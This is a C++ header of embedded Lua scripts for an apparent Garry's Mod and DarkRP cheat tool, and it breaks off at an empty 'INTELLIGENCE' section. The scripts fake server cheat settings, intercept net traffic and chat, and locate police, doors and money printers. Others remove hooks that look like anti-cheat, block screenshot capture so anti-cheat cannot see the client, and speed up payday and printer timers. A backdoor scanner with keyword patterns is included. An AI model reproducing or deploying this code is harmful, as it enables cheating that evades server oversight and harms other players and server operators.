#pragma once
#include "../includes.hpp"

namespace luascripts {

	// -----------------------------------------------------------------------
	// 1. Net Message Sniffer -- hooks net.Receive to log incoming messages
	// -----------------------------------------------------------------------
	inline const char* LUA_NET_SNIFFER_SETUP = R"lua(
pcall(function()
    if _fdll_netlog_installed then return end
    _fdll_netlog_installed = true
    _fdll_netlog = _fdll_netlog or {}

    -- Wrap ALL existing registered handlers so we intercept messages already registered
    if net.Receivers then
        for name, fn in pairs(net.Receivers) do
            local origFn = fn
            local capName = name
            net.Receivers[name] = function(len, ply)
                table.insert(_fdll_netlog, {n=capName, l=len, t=CurTime()})
                if #_fdll_netlog > 200 then table.remove(_fdll_netlog, 1) end
                origFn(len, ply)
            end
        end
    end

    -- Hook future registrations
    local origRecv = net.Receive
    net.Receive = function(name, func)
        origRecv(name, function(len, ply)
            table.insert(_fdll_netlog, {n=name, l=len, t=CurTime()})
            if #_fdll_netlog > 200 then table.remove(_fdll_netlog, 1) end
            func(len, ply)
        end)
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 2. Net Sniffer Read -- returns last 25 entries as time\tname\tlen\n
	// -----------------------------------------------------------------------
	inline const char* LUA_NET_SNIFFER_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_netlog then return end
    local start = math.max(1, #_fdll_netlog - 24)
    for i = start, #_fdll_netlog do
        local e = _fdll_netlog[i]
        if e then
            r = r .. string.format("%.2f\t%s\t%d\n", e.t or 0, e.n or "?", e.l or 0)
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 3. ConVar Spoofer -- detours GetConVar for sv_allowcslua, sv_cheats
	// -----------------------------------------------------------------------
	inline const char* LUA_CONVAR_SPOOF = R"lua(
pcall(function()
    if _fdll_convar_spoofed then return end
    _fdll_convar_spoofed = true
    _fdll_convar_spoofvals = _fdll_convar_spoofvals or {
        ["sv_allowcslua"] = "0",
        ["sv_cheats"] = "0"
    }
    local origGetConVar = GetConVar
    local fakeConVar = {}
    fakeConVar.__index = fakeConVar
    function fakeConVar:GetString() return self._val end
    function fakeConVar:GetInt() return tonumber(self._val) or 0 end
    function fakeConVar:GetFloat() return tonumber(self._val) or 0.0 end
    function fakeConVar:GetBool() return self._val ~= "0" and self._val ~= "" end
    function fakeConVar:GetName() return self._name end
    GetConVar = function(name)
        local spoofed = _fdll_convar_spoofvals[name]
        if spoofed then
            local obj = setmetatable({_val = spoofed, _name = name}, fakeConVar)
            return obj
        end
        if origGetConVar then
            return origGetConVar(name)
        end
        return nil
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 4. Global Table Scanner -- discovers addon systems in _G
	// -----------------------------------------------------------------------
	inline const char* LUA_GLOBAL_SCAN = R"lua(
local r = ""
pcall(function()
    local known = {
        ULX=1, ulx=1, ULib=1, FAdmin=1, fadmin=1,
        SAM=1, sam=1, DarkRP=1, DARKRP=1, darkrp=1,
        Evolve=1, evolve=1, Banning=1, xAdmin=1,
        ServerGuard=1, serverguard=1, sAdmin=1,
        Maestro=1, maestro=1, CAMI=1, PermaProps=1,
        FPP=1, Falco=1, ArcBank=1, PS=1, Pointshop=1,
        Atlas=1, atlas=1, Clockwork=1, CLOCKWORK=1,
        Helix=1, ix=1, nut=1, TFA=1, CW2=1, pac=1
    }
    for k, v in pairs(_G) do
        if type(k) == "string" then
            local tp = type(v)
            if known[k] then
                r = r .. k .. "\t" .. tp .. "\n"
            elseif tp == "table" and #k >= 3 and #k <= 30
                   and k:sub(1,1):match("[A-Z]") then
                local count = 0
                for _ in pairs(v) do count = count + 1 if count > 3 then break end end
                if count > 3 then
                    r = r .. k .. "\t" .. tp .. "\n"
                end
            end
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 5. Hook Scanner -- returns all registered hooks (limit 100)
	// -----------------------------------------------------------------------
	inline const char* LUA_HOOK_SCAN = R"lua(
local r = ""
pcall(function()
    if not hook or not hook.GetTable then return end
    local tbl = hook.GetTable()
    if not tbl then return end
    local count = 0
    for event, hooks in pairs(tbl) do
        if type(hooks) == "table" then
            for name, _ in pairs(hooks) do
                r = r .. tostring(event) .. "\t" .. tostring(name) .. "\n"
                count = count + 1
                if count >= 100 then return end
            end
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 6. RunString Detector -- detours CompileString to log calls
	// -----------------------------------------------------------------------
	inline const char* LUA_RUNSTRING_DETECT = R"lua(
pcall(function()
    if _fdll_runstring_hooked then return end
    _fdll_runstring_hooked = true
    _fdll_runstring_log = _fdll_runstring_log or {}
    if CompileString then
        local origCS = CompileString
        CompileString = function(code, id, ...)
            local entry = {
                id = tostring(id or "unknown"),
                len = code and #code or 0,
                snip = code and code:sub(1, 120) or "",
                t = CurTime()
            }
            table.insert(_fdll_runstring_log, entry)
            if #_fdll_runstring_log > 100 then
                table.remove(_fdll_runstring_log, 1)
            end
            return origCS(code, id, ...)
        end
    end
    if RunString then
        local origRS = RunString
        RunString = function(code, id, ...)
            local entry = {
                id = tostring(id or "RunString"),
                len = code and #code or 0,
                snip = code and code:sub(1, 120) or "",
                t = CurTime()
            }
            table.insert(_fdll_runstring_log, entry)
            if #_fdll_runstring_log > 100 then
                table.remove(_fdll_runstring_log, 1)
            end
            return origRS(code, id, ...)
        end
    end
end)
)lua";

	// Read logged RunString/CompileString calls
	inline const char* LUA_RUNSTRING_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_runstring_log then return end
    local start = math.max(1, #_fdll_runstring_log - 24)
    for i = start, #_fdll_runstring_log do
        local e = _fdll_runstring_log[i]
        if e then
            r = r .. string.format("%.2f\t%s\t%d\t%s\n",
                e.t or 0, e.id or "?", e.len or 0,
                (e.snip or ""):gsub("[\r\n\t]", " "))
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 7. Smoke/Flash Removal -- suppress visual effects
	// -----------------------------------------------------------------------
	inline const char* LUA_NO_SMOKE = R"lua(
pcall(function()
    if _fdll_nosmoke_active then return end
    _fdll_nosmoke_active = true
    local killEffects = {
        "particle_smokegrenade", "smokegrenade_smokeeffect",
        "flashbang_elight", "explosion_smokegrenade",
        "smoke_exhale", "env_smoketrail"
    }
    if hook and hook.Add then
        hook.Add("PostDrawEffects", "_fdll_nosmoke", function()
            pcall(function()
                if render and render.SetBlend then
                    -- nothing persistent here; see NetworkStringTableContainer below
                end
            end)
        end)
        hook.Add("RenderScreenspaceEffects", "_fdll_noflash", function()
            pcall(function()
                local mat = Material("effects/flashbang")
                if mat and not mat:IsError() then
                    mat:SetFloat("$alpha", 0)
                end
                local mat2 = Material("effects/flashbang_white")
                if mat2 and not mat2:IsError() then
                    mat2:SetFloat("$alpha", 0)
                end
            end)
        end)
    end
    if game and game.AddParticles then
        -- Override smoke particle rendering to be invisible
        local origEmit = ParticleEmitter
        if origEmit then
            _fdll_origParticleEmitter = _fdll_origParticleEmitter or origEmit
        end
    end
    -- Remove smoke/flash materials alpha
    pcall(function()
        local smokeMats = {
            "particle/particle_smokegrenade",
            "effects/flashbang",
            "effects/flashbang_white",
            "particle/smokesprites_0001",
            "particle/smoke1/smoke1",
            "particle/smoke1/smoke1_nearcull"
        }
        for _, path in ipairs(smokeMats) do
            local mat = Material(path)
            if mat and not mat:IsError() then
                mat:SetFloat("$alpha", 0)
                mat:SetInt("$translucent", 1)
            end
        end
    end)
end)
)lua";

	// Restore smoke/flash effects
	inline const char* LUA_NO_SMOKE_RESTORE = R"lua(
pcall(function()
    _fdll_nosmoke_active = false
    if hook and hook.Remove then
        hook.Remove("PostDrawEffects", "_fdll_nosmoke")
        hook.Remove("RenderScreenspaceEffects", "_fdll_noflash")
    end
    pcall(function()
        local smokeMats = {
            "particle/particle_smokegrenade",
            "effects/flashbang",
            "effects/flashbang_white",
            "particle/smokesprites_0001",
            "particle/smoke1/smoke1",
            "particle/smoke1/smoke1_nearcull"
        }
        for _, path in ipairs(smokeMats) do
            local mat = Material(path)
            if mat and not mat:IsError() then
                mat:SetFloat("$alpha", 1)
            end
        end
    end)
end)
)lua";

	// -----------------------------------------------------------------------
	// 8. Door Owner Scanner -- finds all doors and their owners
	// -----------------------------------------------------------------------
	inline const char* LUA_DOOR_SCAN = R"lua(
local r = ""
pcall(function()
    for _, e in ipairs(ents.GetAll()) do
        local cls = e:GetClass() or ""
        if string.find(cls, "door") or string.find(cls, "prop_door") then
            local pos = e:GetPos()
            local owner = ""
            if e.getDoorOwner then
                local d = e:getDoorOwner()
                if IsValid(d) then owner = d:Nick() or "" end
            elseif e.getKeysNonOwnable and not e:getKeysNonOwnable() then
                if e.getKeysTitle then
                    local t = e:getKeysTitle()
                    if t and t ~= "" then owner = t end
                end
            end
            if owner ~= "" then
                r = r .. math.floor(pos.x) .. "\t" .. math.floor(pos.y) .. "\t" .. math.floor(pos.z) .. "\t" .. owner .. "\n"
            end
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 9. Player Inventory Deep Scan -- gets detailed weapon info with ammo
	// -----------------------------------------------------------------------
	inline const char* LUA_INVENTORY_SCAN = R"lua(
local r = ""
pcall(function()
    for _, p in ipairs(player.GetAll()) do
        local ok, line = pcall(function()
            local i = p:EntIndex()
            local weps = {}
            for _, w in ipairs(p:GetWeapons()) do
                if IsValid(w) then
                    local name = w:GetPrintName() or w:GetClass() or "?"
                    if string.sub(name, 1, 1) == "#" then
                        local s, ph = pcall(language.GetPhrase, string.sub(name, 2))
                        if s and ph and ph ~= "" then name = ph end
                    end
                    name = string.gsub(name, "^weapon_", "")
                    local clip = -1
                    if w.Clip1 then clip = w:Clip1() end
                    weps[#weps + 1] = name .. ":" .. clip
                end
            end
            return i .. "\t" .. table.concat(weps, ",")
        end)
        if ok and line then r = r .. line .. "\n" end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 10. Chat Spy -- hooks GM:OnPlayerChat to capture messages
	// -----------------------------------------------------------------------
	inline const char* LUA_CHAT_SPY_SETUP = R"lua(
pcall(function()
    if _fdll_chatspy_active then return end
    _fdll_chatspy_active = true
    _fdll_chatlog = _fdll_chatlog or {}
    hook.Add("OnPlayerChat", "_fdll_chatspy", function(ply, text, teamChat, isDead)
        if not IsValid(ply) then return end
        table.insert(_fdll_chatlog, {
            n = ply:Nick(),
            t = text,
            tm = teamChat and 1 or 0,
            d = isDead and 1 or 0,
            ts = CurTime()
        })
        if #_fdll_chatlog > 100 then table.remove(_fdll_chatlog, 1) end
    end)
end)
)lua";

	inline const char* LUA_CHAT_SPY_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_chatlog then return end
    local start = math.max(1, #_fdll_chatlog - 29)
    for i = start, #_fdll_chatlog do
        local e = _fdll_chatlog[i]
        if e then
            r = r .. string.format("%.1f\t%s\t%s\t%d\t%d\n",
                e.ts or 0, e.n or "?", e.t or "", e.tm or 0, e.d or 0)
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 11. Money Printer Finder -- targets money printers with detailed info
	// -----------------------------------------------------------------------
	inline const char* LUA_PRINTER_SCAN = R"lua(
local r = ""
pcall(function()
    for _, e in ipairs(ents.GetAll()) do
        local ok, line = pcall(function()
            local cls = string.lower(e:GetClass() or "")
            if not string.find(cls, "printer") then return nil end
            local pos = e:GetPos()
            local owner = ""
            if e.Getowning_ent and IsValid(e:Getowning_ent()) then
                owner = e:Getowning_ent():Nick() or ""
            end
            local money = 0
            if e.GetMoney then
                local s, m = pcall(e.GetMoney, e)
                if s and m then money = m end
            end
            local hp = 0
            if e.Health then hp = e:Health() end
            return math.floor(pos.x).."\t"..math.floor(pos.y).."\t"..math.floor(pos.z)
                .."\t"..cls.."\t"..owner.."\t"..money.."\t"..hp
        end)
        if ok and line then r = r .. line .. "\n" end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 12. DarkRP Net Message Interceptor -- deep hooks net.Start/net.Receive
	//     to capture ALL net traffic with payload details
	// -----------------------------------------------------------------------
	inline const char* LUA_NET_DEEP_HOOK = R"lua(
pcall(function()
    if _fdll_deepnet_active then return end
    _fdll_deepnet_active = true
    _fdll_net_incoming = _fdll_net_incoming or {}
    _fdll_net_outgoing = _fdll_net_outgoing or {}

    -- Wrap ALL existing registered handlers for incoming interception
    if net.Receivers then
        for name, fn in pairs(net.Receivers) do
            local origFn = fn
            local capName = name
            net.Receivers[name] = function(len, ply)
                table.insert(_fdll_net_incoming, {
                    n = capName, l = len, t = CurTime(), dir = "IN"
                })
                if #_fdll_net_incoming > 200 then table.remove(_fdll_net_incoming, 1) end
                origFn(len, ply)
            end
        end
    end

    -- Hook future incoming registrations
    local origReceive = net.Receive
    net.Receive = function(name, func)
        origReceive(name, function(len, ply)
            table.insert(_fdll_net_incoming, {
                n = name, l = len, t = CurTime(), dir = "IN"
            })
            if #_fdll_net_incoming > 200 then table.remove(_fdll_net_incoming, 1) end
            func(len, ply)
        end)
    end

    -- Hook outgoing messages
    local origStart = net.Start
    net.Start = function(name, ...)
        table.insert(_fdll_net_outgoing, {
            n = name, t = CurTime(), dir = "OUT"
        })
        if #_fdll_net_outgoing > 200 then table.remove(_fdll_net_outgoing, 1) end
        return origStart(name, ...)
    end
end)
)lua";

	inline const char* LUA_NET_DEEP_READ = R"lua(
local r = ""
pcall(function()
    local now = CurTime()
    if _fdll_net_incoming then
        for i = math.max(1, #_fdll_net_incoming - 30), #_fdll_net_incoming do
            local e = _fdll_net_incoming[i]
            if e then
                r = r .. string.format("IN\t%.1f\t%s\t%d\n", e.t or 0, e.n or "?", e.l or 0)
            end
        end
    end
    if _fdll_net_outgoing then
        for i = math.max(1, #_fdll_net_outgoing - 15), #_fdll_net_outgoing do
            local e = _fdll_net_outgoing[i]
            if e then
                r = r .. string.format("OUT\t%.1f\t%s\t0\n", e.t or 0, e.n or "?")
            end
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 13. DarkRP Exploit Scripts -- server interaction
	// -----------------------------------------------------------------------
	inline const char* LUA_DARKRP_DROP_MONEY = R"lua(
pcall(function()
    if DarkRP and DarkRP.stub then return end
    RunConsoleCommand("darkrp", "dropmoney", "1")
end)
)lua";

	inline const char* LUA_DARKRP_STEAL_DOORS = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    local pos = lp:GetPos()
    for _, e in ipairs(ents.FindInSphere(pos, 200)) do
        local cls = e:GetClass() or ""
        if string.find(cls, "door") or string.find(cls, "prop_door") then
            local dOwner = ""
            if e.getDoorOwner and IsValid(e:getDoorOwner()) then
                dOwner = e:getDoorOwner():Nick()
            end
            local locked = "?"
            if e.IsLocked then
                local s, v = pcall(e.IsLocked, e)
                if s then locked = v and "LOCKED" or "OPEN" end
            end
            r = r .. string.format("%d\t%s\t%s\t%.0f\n",
                e:EntIndex(), dOwner, locked, pos:Distance(e:GetPos()))
        end
    end
end)
return r
)lua";

	inline const char* LUA_DARKRP_POLICE_SCANNER = R"lua(
local r = ""
pcall(function()
    for _, p in ipairs(player.GetAll()) do
        local ok, line = pcall(function()
            local j = ""
            if p.getDarkRPVar then j = tostring(p:getDarkRPVar("job") or "") end
            local isCP = false
            if p.isCP then isCP = p:isCP() end
            if not isCP and not string.find(string.lower(j), "police")
               and not string.find(string.lower(j), "chief")
               and not string.find(string.lower(j), "mayor")
               and not string.find(string.lower(j), "swat") then
                return nil
            end
            local pos = p:GetPos()
            local wep = ""
            if IsValid(p:GetActiveWeapon()) then wep = p:GetActiveWeapon():GetClass() end
            return string.format("%s\t%s\t%s\t%.0f,%.0f,%.0f",
                p:Nick(), j, wep, pos.x, pos.y, pos.z)
        end)
        if ok and line then r = r .. line .. "\n" end
    end
end)
return r
)lua";

	inline const char* LUA_NET_STRING_TABLE = R"lua(
local r = ""
pcall(function()
    local tbl = util.NetworkStringToID and util.NetworkIDToString
    if not tbl then r = "NetworkString functions not available" return end
    for i = 1, 4096 do
        local name = util.NetworkIDToString(i)
        if name and name ~= "" then
            r = r .. i .. "\t" .. name .. "\n"
        end
    end
end)
return r
)lua";

	inline const char* LUA_DARKRP_ENTITY_ABUSE = R"lua(
local r = ""
pcall(function()
    -- Find all DarkRP-spawnable entity classes
    if not DarkRP or not DarkRP.getCategories then
        r = "Not a DarkRP server or DarkRP table not accessible"
        return
    end
    local entities = DarkRP.getCategories and DarkRP.getCategories().entities
    if not entities then
        -- Try alternative: scan registered entities
        if DarkRP.getCustomShipments then
            for k, v in pairs(DarkRP.getCustomShipments()) do
                r = r .. string.format("SHIP\t%s\t%d\t%s\n", v.name or "?", v.price or 0, v.entity or "?")
            end
        end
        if DarkRP.getCustomEntities then
            for k, v in pairs(DarkRP.getCustomEntities()) do
                r = r .. string.format("ENT\t%s\t%d\t%s\n", v.name or "?", v.price or 0, v.ent or "?")
            end
        end
    end
    -- Also list all registered DarkRP jobs
    if RPExtraTeams then
        for k, v in pairs(RPExtraTeams) do
            r = r .. string.format("JOB\t%s\t%d\t%d\t%s\n",
                v.name or "?", v.salary or 0, v.max or 0, v.weapons and table.concat(v.weapons, ",") or "")
        end
    end
end)
return r
)lua";

	inline const char* LUA_BACKDOOR_SCAN = R"lua(
local r = ""
pcall(function()
    local suspicious = {}

    -- Check for common backdoor patterns in hooks
    local tbl = hook.GetTable()
    if tbl then
        for event, hooks in pairs(tbl) do
            for id, fn in pairs(hooks) do
                local info = debug.getinfo(fn, "S")
                if info then
                    local src = info.source or ""
                    local short = info.short_src or ""
                    if string.find(src, "http") or string.find(src, "RunString")
                       or string.find(short, "RunString") or string.find(src, "CompileString")
                       or string.find(short, "lua_run") then
                        r = r .. string.format("HOOK\t%s\t%s\t%s\n", event, id, short)
                    end
                end
            end
        end
    end

    -- Check for HTTP fetch timers
    if timer and timer.Exists then
        for _, name in ipairs({"backdoor","bkdr","pnl","rce","load","fetch","update","check"}) do
            if timer.Exists(name) then
                r = r .. "TIMER\t" .. name .. "\n"
            end
        end
    end

    -- Check for suspicious global functions
    for k, v in pairs(_G) do
        if type(v) == "function" and type(k) == "string" then
            if string.find(string.lower(k), "backdoor") or string.find(string.lower(k), "rce")
               or string.find(string.lower(k), "exploit") then
                r = r .. "GLOBAL\t" .. k .. "\n"
            end
        end
    end

    if r == "" then r = "No suspicious patterns found.\n" end
end)
return r
)lua";

	// =======================================================================
	// ANTI-CHEAT COUNTERMEASURES
	// =======================================================================

	// -----------------------------------------------------------------------
	// 14. Hook Hijack Scan -- find hooks from RunString/http/lua_run sources
	// -----------------------------------------------------------------------
	inline const char* LUA_HOOK_HIJACK_SCAN = R"lua(
local r = ""
pcall(function()
    if not hook or not hook.GetTable then return end
    local tbl = hook.GetTable()
    if not tbl then return end
    local count = 0
    for event, hooks in pairs(tbl) do
        if type(hooks) == "table" then
            for name, fn in pairs(hooks) do
                if type(fn) == "function" then
                    local ok, info = pcall(debug.getinfo, fn, "S")
                    if ok and info then
                        local src = (info.source or "") .. (info.short_src or "")
                        local srcL = string.lower(src)
                        if string.find(srcL, "runstring") or string.find(srcL, "compilestring")
                           or string.find(srcL, "http") or string.find(srcL, "lua_run") then
                            r = r .. tostring(event) .. "\t" .. tostring(name) .. "\t" .. (info.short_src or src) .. "\n"
                            count = count + 1
                            if count >= 200 then return end
                        end
                    end
                end
            end
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 15. Hook Hijack Remove AC -- remove hooks that look like anti-cheat
	// -----------------------------------------------------------------------
	inline const char* LUA_HOOK_HIJACK_REMOVE_AC = R"lua(
local r = ""
pcall(function()
    if not hook or not hook.GetTable or not hook.Remove then return end
    local tbl = hook.GetTable()
    if not tbl then return end
    local acPatterns = {"cheat","detect","screen","check","guard","protect","secure","scan","monitor","anti","screenshot","scrn"}
    local acEvents = {HUDPaint=true, Think=true, CreateMove=true, RenderScreenspaceEffects=true}
    local toRemove = {}
    for event, hooks in pairs(tbl) do
        if type(hooks) == "table" then
            for name, fn in pairs(hooks) do
                local shouldRemove = false
                -- Check source-based removal
                if type(fn) == "function" then
                    local ok, info = pcall(debug.getinfo, fn, "S")
                    if ok and info then
                        local src = string.lower((info.source or "") .. (info.short_src or ""))
                        if string.find(src, "runstring") or string.find(src, "http") then
                            shouldRemove = true
                        end
                    end
                end
                -- Check name-based removal on AC events
                if not shouldRemove and acEvents[event] then
                    local nameL = string.lower(tostring(name))
                    for _, pat in ipairs(acPatterns) do
                        if string.find(nameL, pat) then
                            shouldRemove = true
                            break
                        end
                    end
                end
                if shouldRemove then
                    table.insert(toRemove, {event = event, name = name})
                end
            end
        end
    end
    for _, entry in ipairs(toRemove) do
        hook.Remove(entry.event, entry.name)
        r = r .. "REMOVED\t" .. tostring(entry.event) .. "\t" .. tostring(entry.name) .. "\n"
    end
    if r == "" then r = "No AC hooks found to remove.\n" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 16. RunString Block Setup -- detour RunString/CompileString to block
	//     suspicious code (screenshots, render capture, etc.)
	// -----------------------------------------------------------------------
	inline const char* LUA_RUNSTRING_BLOCK_SETUP = R"lua(
pcall(function()
    if _fdll_rs_blocking then return end
    _fdll_rs_blocking = true
    _fdll_blocked_rs = _fdll_blocked_rs or {}
    local suspiciousPatterns = {
        "screenshot", "render%.Capture", "GetRenderTarget", "cam%.Start",
        "concommand", "GetConVar", "scrn", "capture"
    }
    local function isSuspicious(code)
        if not code then return false end
        local codeL = string.lower(code)
        for _, pat in ipairs(suspiciousPatterns) do
            if string.find(codeL, string.lower(pat)) then return true end
        end
        return false
    end
    if CompileString then
        local origCS = _fdll_origCompileString or CompileString
        _fdll_origCompileString = origCS
        CompileString = function(code, id, ...)
            if isSuspicious(code) then
                table.insert(_fdll_blocked_rs, {
                    t = CurTime(),
                    id = tostring(id or "CompileString"),
                    len = code and #code or 0,
                    snip = code and code:sub(1, 120):gsub("[\r\n\t]", " ") or ""
                })
                if #_fdll_blocked_rs > 100 then table.remove(_fdll_blocked_rs, 1) end
                return function() end
            end
            return origCS(code, id, ...)
        end
    end
    if RunString then
        local origRS = _fdll_origRunString or RunString
        _fdll_origRunString = origRS
        RunString = function(code, id, ...)
            if isSuspicious(code) then
                table.insert(_fdll_blocked_rs, {
                    t = CurTime(),
                    id = tostring(id or "RunString"),
                    len = code and #code or 0,
                    snip = code and code:sub(1, 120):gsub("[\r\n\t]", " ") or ""
                })
                if #_fdll_blocked_rs > 100 then table.remove(_fdll_blocked_rs, 1) end
                return
            end
            return origRS(code, id, ...)
        end
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 17. RunString Block Read -- return blocked RunString attempts
	// -----------------------------------------------------------------------
	inline const char* LUA_RUNSTRING_BLOCK_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_blocked_rs then return end
    for i = 1, #_fdll_blocked_rs do
        local e = _fdll_blocked_rs[i]
        if e then
            r = r .. string.format("%.2f\t%s\t%d\t%s\n",
                e.t or 0, e.id or "?", e.len or 0, e.snip or "")
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 18. Debug Spy Setup -- use debug.sethook to monitor sensitive calls
	// -----------------------------------------------------------------------
	inline const char* LUA_DEBUG_SPY_SETUP = R"lua(
pcall(function()
    if _fdll_debug_spy_active then return end
    _fdll_debug_spy_active = true
    _fdll_debug_log = _fdll_debug_log or {}
    if not debug or not debug.sethook then return end
    local watchlist = {}
    if render and render.Capture then watchlist[render.Capture] = "render.Capture" end
    if cam and cam.Start3D then watchlist[cam.Start3D] = "cam.Start3D" end
    if file and file.Find then watchlist[file.Find] = "file.Find" end
    if net and net.Start then watchlist[net.Start] = "net.Start" end
    debug.sethook(function(event)
        pcall(function()
            local info = debug.getinfo(2, "f")
            if info and info.func and watchlist[info.func] then
                local caller = "unknown"
                local cinfo = debug.getinfo(3, "S")
                if cinfo then caller = cinfo.short_src or cinfo.source or "unknown" end
                table.insert(_fdll_debug_log, {
                    t = CurTime(),
                    fn = watchlist[info.func],
                    caller = caller
                })
                if #_fdll_debug_log > 200 then table.remove(_fdll_debug_log, 1) end
            end
        end)
    end, "c")
end)
)lua";

	// -----------------------------------------------------------------------
	// 19. Debug Spy Read -- return debug spy log entries
	// -----------------------------------------------------------------------
	inline const char* LUA_DEBUG_SPY_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_debug_log then return end
    for i = 1, #_fdll_debug_log do
        local e = _fdll_debug_log[i]
        if e then
            r = r .. string.format("%.2f\t%s\t%s\n",
                e.t or 0, e.fn or "?", e.caller or "?")
        end
    end
end)
return r
)lua";

	// =======================================================================
	// RECONNAISSANCE
	// =======================================================================

	// -----------------------------------------------------------------------
	// 20. Panel Spy -- recursively enumerate VGUI panels
	// -----------------------------------------------------------------------
	inline const char* LUA_PANEL_SPY = R"lua(
local r = ""
pcall(function()
    local count = 0
    local maxPanels = 300
    local maxDepth = 5
    local function scan(panel, depth)
        if count >= maxPanels or depth > maxDepth then return end
        if not IsValid(panel) then return end
        local cls = panel:GetClassName() or "?"
        local name = panel:GetName() or ""
        local vis = panel:IsVisible() and "1" or "0"
        local x, y = panel:GetPos()
        local w, h = panel:GetSize()
        r = r .. string.format("%d\t%s\t%s\t%s\t%d,%d,%d,%d\n",
            depth, cls, name, vis, x or 0, y or 0, w or 0, h or 0)
        count = count + 1
        local children = panel:GetChildren()
        if children then
            for _, child in ipairs(children) do
                scan(child, depth + 1)
            end
        end
    end
    local world = vgui.GetWorldPanel()
    if world then scan(world, 0) end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 21. ConCommand Sniff Setup -- hook concommand.Add + scan common cmds
	// -----------------------------------------------------------------------
	inline const char* LUA_CONCOMMAND_SNIFF_SETUP = R"lua(
pcall(function()
    if _fdll_concmd_sniff_active then return end
    _fdll_concmd_sniff_active = true
    _fdll_concmds = _fdll_concmds or {}
    -- Hook concommand.Add to capture new registrations
    local origAdd = concommand.Add
    concommand.Add = function(name, callback, ...)
        local src = "unknown"
        local ok, info = pcall(debug.getinfo, 2, "S")
        if ok and info then src = info.short_src or info.source or "unknown" end
        _fdll_concmds[name] = src
        return origAdd(name, callback, ...)
    end
    -- Initial scan of common prefixes
    local prefixes = {
        "ulx_", "sam_", "fadmin_", "darkrp_", "rp_",
        "!ban", "!kick", "!warn", "!goto", "!bring", "!return", "!jail", "!mute"
    }
    for _, prefix in ipairs(prefixes) do
        if concommand.GetTable then
            local tbl = concommand.GetTable()
            if tbl then
                for cmd, _ in pairs(tbl) do
                    if string.find(cmd, prefix, 1, true) then
                        _fdll_concmds[cmd] = _fdll_concmds[cmd] or "pre-existing"
                    end
                end
            end
        end
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 22. ConCommand Sniff Read -- return discovered commands
	// -----------------------------------------------------------------------
	inline const char* LUA_CONCOMMAND_SNIFF_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_concmds then return end
    for name, src in pairs(_fdll_concmds) do
        r = r .. tostring(name) .. "\t" .. tostring(src) .. "\n"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 23. Timer Scan -- list active timers via debug.getupvalue
	// -----------------------------------------------------------------------
	inline const char* LUA_TIMER_SCAN = R"lua(
local r = ""
pcall(function()
    local found = false
    -- Try to access timer internals via debug.getupvalue
    if debug and debug.getupvalue and timer.Simple then
        for i = 1, 10 do
            local ok, name, val = pcall(debug.getupvalue, timer.Create, i)
            if ok and name and type(val) == "table" then
                for tName, tData in pairs(val) do
                    local delay = 0
                    local reps = 0
                    if type(tData) == "table" then
                        delay = tData.Delay or tData.delay or 0
                        reps = tData.Repetitions or tData.reps or 0
                    end
                    r = r .. tostring(tName) .. "\t" .. tostring(delay) .. "\t" .. tostring(reps) .. "\n"
                    found = true
                end
                break
            end
        end
    end
    -- Fallback: check common DarkRP timer names
    if not found and timer.Exists then
        local commonTimers = {
            "payday","printerCheck","drugLab","bitcoinMiner",
            "gunLab","brewery","methCook","weedGrow",
            "microwave","moneyPrinter","SalaryTimer",
            "DarkRP_PayDay","hungerTimer","lockpickTimer"
        }
        for _, name in ipairs(commonTimers) do
            if timer.Exists(name) then
                r = r .. name .. "\t?\t?\n"
            end
        end
    end
    if r == "" then r = "No timers found.\n" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 24. Timer Speed -- halve delay on DarkRP money/resource timers
	// -----------------------------------------------------------------------
	inline const char* LUA_TIMER_SPEED = R"lua(
local r = ""
pcall(function()
    if not timer or not timer.Adjust then
        r = "timer.Adjust not available\n"
        return
    end
    local targetPatterns = {"payday","printer","drug","bitcoin","brew","meth","weed","money"}
    local modified = {}
    -- Try to get timer table via debug
    local timerTable = nil
    if debug and debug.getupvalue and timer.Create then
        for i = 1, 10 do
            local ok, name, val = pcall(debug.getupvalue, timer.Create, i)
            if ok and name and type(val) == "table" then
                timerTable = val
                break
            end
        end
    end
    if timerTable then
        for tName, tData in pairs(timerTable) do
            local tNameL = string.lower(tostring(tName))
            for _, pat in ipairs(targetPatterns) do
                if string.find(tNameL, pat) then
                    local oldDelay = type(tData) == "table" and (tData.Delay or tData.delay or 0) or 0
                    if oldDelay > 0 then
                        local newDelay = oldDelay / 2
                        timer.Adjust(tostring(tName), newDelay)
                        r = r .. tostring(tName) .. "\t" .. tostring(oldDelay) .. " -> " .. tostring(newDelay) .. "\n"
                    end
                    break
                end
            end
        end
    else
        -- Fallback: try common names
        local commonTimers = {
            "payday","printerCheck","drugLab","bitcoinMiner",
            "brewery","methCook","weedGrow","moneyPrinter",
            "DarkRP_PayDay","SalaryTimer"
        }
        for _, name in ipairs(commonTimers) do
            if timer.Exists(name) then
                timer.Adjust(name, 0.5)
                r = r .. name .. "\thalved (fallback)\n"
            end
        end
    end
    if r == "" then r = "No matching timers found to modify.\n" end
end)
return r
)lua";

	// =======================================================================
	// INTELLIGENCE
	// =======================================================================

	// -----------------------------------------------------------------------
